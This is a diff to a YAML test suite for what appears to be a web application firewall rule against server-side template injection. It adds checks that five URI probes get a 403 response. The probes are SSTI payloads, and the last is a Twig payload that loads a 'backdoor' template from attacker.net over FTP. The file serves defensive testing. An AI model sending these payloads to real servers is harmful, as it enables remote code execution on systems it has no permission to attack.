@@ -18,6 +18,7 @@ tests:
             uri: "/?param=%3C%25%3D+1%2A1%25%3E" # urlencode("<%= 1*1%>")
           output:
             log_contains: 'id "666666006"'
+            response_contains: "403 Forbidden"
   - test_title: "666666006 - Server side template injection in URI 2"
     stages:
       - stage:
@@ -31,6 +32,7 @@ tests:
             uri: "/?param=%23%7B+1%2A1%7D" # urlencode("#{ 1*1}")
           output:
             log_contains: 'id "666666006"'
+            response_contains: "403 Forbidden"
   - test_title: "666666006 - Server side template injection in URI 3"
     stages:
       - stage:
@@ -44,6 +46,7 @@ tests:
             uri: "/?param=${class.getResource(\"\").getPath()}"
           output:
             log_contains: 'id "666666006"'
+            response_contains: "403 Forbidden"
   - test_title: "666666006 - Server side template injection in URI 4"
     stages:
       - stage:
@@ -57,6 +60,7 @@ tests:
             uri: "/?param=${{7*7}}"
           output:
             log_contains: 'id "666666006"'
+            response_contains: "403 Forbidden"
   - test_title: "666666006 - Server side template injection in URI 5"
     stages:
       - stage:
@@ -70,3 +74,4 @@ tests:
             uri: "/?param=%7B%7B_self.env.setCache%28%22ftp%3A%2F%2Fattacker.net%3A2121%22%29%7D%7D%7B%7B_self.env.loadTemplate%28%22backdoor%22%29%7D%7D" # urlencode("{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}")
           output:
             log_contains: 'id "666666006"'
+            response_contains: "403 Forbidden"
